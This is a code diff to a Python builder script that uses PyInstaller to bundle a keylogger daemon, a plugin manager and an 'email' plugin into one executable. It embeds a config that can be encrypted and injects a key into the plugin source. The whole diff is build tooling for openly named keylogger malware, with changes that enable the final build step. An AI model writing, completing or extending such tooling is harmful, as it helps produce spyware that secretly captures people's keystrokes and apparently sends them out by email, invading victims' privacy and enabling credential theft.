@@ -5,7 +5,7 @@ import shutil
 
 from PyInstaller.building import makespec
 from PyInstaller.__main__ import run as PIbuilder
-from tempfile import TemporaryDirectory
+from tempfile import TemporaryDirectory, TemporaryFile
 
 
 class Builder:
@@ -13,12 +13,15 @@ class Builder:
     store configs in configuration file
     embed config file with exe at build time
 
-    build_spec = {encrypt_config="key_password",
-                plugin_name="**kwargs" or True if no **kwargs,
-                plugin_config=""}
+    build_spec = {
+                encrypt_config="key_password",
+                plugin_name="email",
+                plugin_config={**config fro plugin**}
+                }
 
+    (built)
     config={
-        plugin="plugin to use"
+        plugin_name="plugin to use"
         plugin_config="{config for plugin}"
     }
 
@@ -31,6 +34,7 @@ class Builder:
 
     def __init__(self, **build_spec):
         self.build_spec = build_spec
+        self.spec = TemporaryFile()
         self.__working_folder = TemporaryDirectory()
         self.paths = {"Key_logger_daemon": self.__copy_to_temp("Key_logger_daemon.py"),
                       "plugin_manager": self.__copy_to_temp("plugin_manager.py"),
@@ -38,16 +42,15 @@ class Builder:
                       "plugin_base": self.__copy_to_temp("plugins", "plugin_base.py"),
                       "plugin": self.__copy_to_temp("plugins", build_spec["plugin_name"] + ".py"),
                       "config": self.__copy_to_temp("config.json"),
-                      "work": op.join(self.__working_folder.name, "work"),
-                      "spec": op.join(self.__working_folder.name, "out.spec")}
+                      "work": op.join(self.__working_folder.name, "work")}
 
         # validate config before dumping
         json.dump({"plugin_name": build_spec["plugin_name"],
                    "plugin_config": build_spec["plugin_config"] if "plugin_config" in build_spec.keys() else dict()},
-                  self.paths["config"])
+                  open(self.paths["config"], "w"))
 
-        if "encrypt_config" in build_spec:  # insert config key into plugin manager source
-            self.__insert_config_key(build_spec["encrypt_config"])
+        if "key" in build_spec:  # insert config key into plugin manager source same key to encrypt byte
+            self.__insert_config_key(build_spec["key"])
 
     def __insert_config_key(self, key):
         with open(self.paths["plugin_manager"], "rb+") as f:
@@ -69,9 +72,9 @@ class Builder:
         # change to def for readability
         check_in_build_spec = lambda key: self.build_spec[key] if key in self.build_spec.keys() else None
         makespec.main([self.paths["Key_logger_daemon"]],
-                      specpath=[self.paths["spec"]],  # writes spec to temp
+                      specpath=self.spec.name,  # writes spec to temp
                       onefile=True,
-                      console=False,
+                      console=True,
                       pathex=[self.__working_folder.name],
                       datas=[(self.paths["config"], ".")],
                       key=check_in_build_spec("key"),
@@ -80,7 +83,7 @@ class Builder:
 
     def build(self):
         self.__make_spec()
-        PIbuilder(['--distpath', self.build_spec["out_path"], self.paths["spec"]])
+        PIbuilder(['--distpath', self.build_spec["out_path"], self.spec.name])
 
 
-Builder(plugin_name="email", out_path="C:\\Users\\me\\Projects\\Python\\KeyLoggerBuildable")  # .build()
+Builder(plugin_name="email", out_path="C:\\Users\\me\\Projects\\Python\\KeyLoggerBuildable").build()
